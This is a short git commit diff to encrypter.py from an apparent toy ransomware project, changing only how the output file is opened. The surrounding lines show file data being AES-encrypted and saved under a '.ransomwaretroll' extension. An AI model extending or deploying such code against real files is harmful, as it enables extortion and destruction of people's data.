2aeca695dc7f522a1cd8d4faf3b46ffcf6de4df2
carolinarodrisan <82915728+carolinarodrisan@users.noreply.github.com>
2024-01-10 22:04:26 -0300

    Update encrypter.py

--- encrypter.py
+++ encrypter.py
@@ -19,6 +19,6 @@ crypto_data = aes.encrypt(file_data)
 
 ## salvar o arquivo criptografado
 new_file = file_name + ".ransomwaretroll"
-new_file = open(f'{new_file}','wb')
+new_file = open(new_file,'wb')
 new_file.write(crypto_data)
 new_file.close()
